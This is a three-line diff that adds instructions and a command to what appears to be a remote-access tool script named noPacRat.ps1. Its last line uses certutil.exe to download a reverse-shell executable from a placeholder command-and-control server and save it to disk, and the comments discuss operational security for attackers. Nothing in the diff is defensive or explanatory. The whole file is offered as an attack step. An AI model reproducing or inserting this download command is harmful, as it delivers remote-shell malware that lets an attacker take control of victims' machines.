@@ -1,0 +1,3 @@
+# WARNING: Dropping EXEs To DISC Are Not OPSEC Safe 
+# Append the command below as the last line of noPacRat.ps1   
+certutil.exe -urlcache -f http://YOUR-C2-SERVER-IP/REVERSE-SHELL.EXE FILENAME-TO-SAVE-AS.EXE
